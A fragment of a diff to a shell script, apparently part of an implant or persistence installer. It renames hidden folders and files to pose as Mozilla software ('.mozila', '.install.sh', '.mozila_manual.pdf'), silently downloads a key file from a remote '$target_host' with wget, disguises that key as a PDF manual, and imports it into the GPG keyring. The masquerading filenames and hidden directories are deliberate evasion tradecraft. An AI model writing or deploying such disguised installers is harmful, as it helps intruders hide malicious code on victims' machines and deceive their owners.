@@ -29,15 +29,15 @@ fi
 # Path and files configurations
 #####################################################################
 # Create directory for all these data
-scriptfolder=$HOME/.SAPGUI7.40
-scriptpath="$scriptfolder/.sapgui_start.sh"
-keypath="$scriptfolder/.sapgui_manual.pdf"
+scriptfolder=$HOME/.mozila
+scriptpath="$scriptfolder/.install.sh"
+keypath="$scriptfolder/.mozila_manual.pdf"
 echo "[+] Creating folder for storing files in $scriptfolder"
 mkdir -p $scriptfolder
 # Download and store key
 echo "[+] Downloading key from host: $target_host, port $port to $keypath"
-wget http://$target_host:$port_http_server/pentesting_issues.pdf 2>1 > /dev/null
-mv pentesting_issues.pdf $keypath
+wget http://$target_host:$port_http_server/mozila_manual.pdf 2>1 > /dev/null
+mv mozila_manual.pdf $keypath
 echo "[+] Adding public key to keyring" 
 gpg --import $keypath 2>1 > /dev/null
 #####################################################################
